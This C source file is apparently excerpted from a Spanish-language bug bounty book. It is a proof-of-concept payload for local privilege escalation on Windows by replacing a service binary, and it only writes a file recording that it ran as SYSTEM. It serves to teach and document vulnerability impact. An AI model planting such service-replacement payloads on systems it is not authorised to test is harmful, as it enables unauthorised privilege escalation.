// Extraído de: LibroBugBounty/cap-17-poc-impacto.md
// payload_service.c — Payload para LPE via service binary replacement
#include <windows.h>
#include <stdio.h>

int main() {
    // Escribir evidencia de ejecución como SYSTEM
    FILE* f = fopen("C:\\Users\\Public\\epic_lpe_proof.txt", "w");
    if (f) {
        // Obtener username (debería ser SYSTEM)
        char username[256];
        DWORD size = sizeof(username);
        GetUserNameA(username, &size);

        fprintf(f, "Username:      %s\n", username);
        fprintf(f, "PID:           %d\n", GetCurrentProcessId());

        // Obtener path del proceso
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        fprintf(f, "Process:       %s\n", path);

        // Timestamp
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "Time:          %04d-%02d-%02d %02d:%02d:%02d\n",
                st.wYear, st.wMonth, st.wDay,
                st.wHour, st.wMinute, st.wSecond);

        fclose(f);
    }

    // El SCM espera que el servicio se registre.
    // Como no lo hacemos, el SCM reportará error 1053 (timeout).
    // Pero nuestro código ya ejecutó como SYSTEM.
    Sleep(5000);
    return 0;
}
